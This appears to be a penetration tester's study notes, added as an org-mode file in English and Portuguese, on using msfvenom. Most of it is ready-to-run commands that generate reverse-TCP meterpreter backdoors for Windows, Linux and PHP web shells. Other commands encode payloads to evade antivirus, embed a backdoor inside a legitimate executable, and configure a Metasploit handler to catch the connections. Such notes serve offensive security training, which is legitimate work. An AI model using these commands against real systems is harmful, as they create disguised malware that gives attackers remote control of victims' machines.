@@ -1,0 +1,77 @@
+#+title: Msfvenom
+#+author: gabriel
+
+* intro
+msfvenom is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers
+
+msfvenom is a combination of two utilities, namely msfpayload and msfencode
+
+we can use msfvenom to generate malicious meterpreter payload that can be transferred to a client target system. once executed, it will connect back to our payload handler and provide us with remote access to the target system
+
+O MSFVenom é a combinação do antigo /msfpayload/ e /msfencode/. É a ferramenta padrão do Metasploit para gerar payloads, permitindo a criação de executáveis, scripts e shellcodes para diversas plataformas (Windows, Linux, Android, etc.).
+
+* 🛠️ Estrutura do Comando e Sintaxe
+A construção de um comando msfvenom segue um padrão lógico de opções:
+
+| Flag | Descrição | Exemplo |
+|------+-----------+---------|
+| *-p* | Payload selecionado | windows/x64/meterpreter/reverse_tcp |
+| *LHOST* | IP do atacante (sua máquina) | 192.168.1.10 |
+| *LPORT* | Porta de escuta | 4444 |
+| *-f* | Formato de saída | exe, elf, raw, msi, vba |
+| *-e* | Encoder para ofuscação | x86/shikata_ga_nai |
+| *-i* | Número de iterações do encoder | 3 |
+| *-o* | Arquivo de saída | shell.exe |
+
+* 🚀 Exemplos Práticos por Plataforma
+
+** Windows (Executável)
+Ideal para ataques de engenharia social ou elevação de privilégios após um bypass de UAC.
+#+BEGIN_SRC bash
+# Payload Staged (Usa /)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o backdoor.exe
+#+END_SRC
+
+** Linux (ELF)
+Útil para servidores Linux ou sistemas integrados (IoT).
+#+BEGIN_SRC bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
+#+END_SRC
+
+** Web (PHP/ASPX)
+Para exploração de vulnerabilidades como *Unrestricted File Upload*.
+#+BEGIN_SRC bash
+# PHP Web Shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php
+#+END_SRC
+
+* 🕵️ Ofuscação e Evasão
+A encodificação ajuda a evitar assinaturas estáticas de antivírus básicos, embora IDSs modernos exijam técnicas mais avançadas.
+
+** Usando Encoders
+#+BEGIN_SRC bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
+#+END_SRC
+
+** Injeção em Executável Legítimo (-x)
+Permite embutir o payload dentro de um programa real (ex: calc.exe), tornando-o menos suspeito.
+#+BEGIN_SRC bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -x /usr/share/windows-binaries/plink.exe -f exe -o plink_malicioso.exe
+#+END_SRC
+
+* 📊 Listagem de Recursos
+Para explorar as capacidades do msfvenom diretamente no seu Zsh:
+- =msfvenom -l payloads=: Lista todos os payloads disponíveis.
+- =msfvenom -l formats=: Lista os formatos de saída suportados.
+- =msfvenom -l encoders=: Lista os encoders para ofuscação.
+
+* 💡 Dica de Fluxo (INE Training)
+Como visto no seu treinamento, após gerar o payload e enviá-lo via Meterpreter ou Evil-WinRM, certifique-se de que o =multi/handler= no Metasploit está configurado com o *mesmo* payload e porta utilizados na geração.
+
+#+BEGIN_SRC msf
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST <IP>
+set LPORT 4444
+run
+#+END_SRC
